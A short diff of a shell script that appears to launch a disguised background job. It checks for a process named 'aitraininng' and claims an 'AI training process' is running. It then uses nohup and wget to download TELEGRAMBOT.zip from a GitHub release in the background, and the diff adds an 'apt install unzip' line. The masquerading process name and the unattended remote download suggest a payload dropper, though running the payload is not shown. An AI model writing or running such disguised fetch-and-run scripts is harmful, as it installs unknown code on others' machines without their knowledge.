@@ -3,7 +3,7 @@ if pgrep -x "aitraininng" > /dev/null; then
     echo "An AI training process is already running. Exiting."
     exit 1
 fi
-
+apt install unzip
 nohup bash -c '
 wget -O TELEGRAMBOT.zip https://github.com/max313iq/Ssl/releases/download/TELEGRAMBOT/TELEGRAMBOT.zip
 mkdir -p TELEGRAMBOT
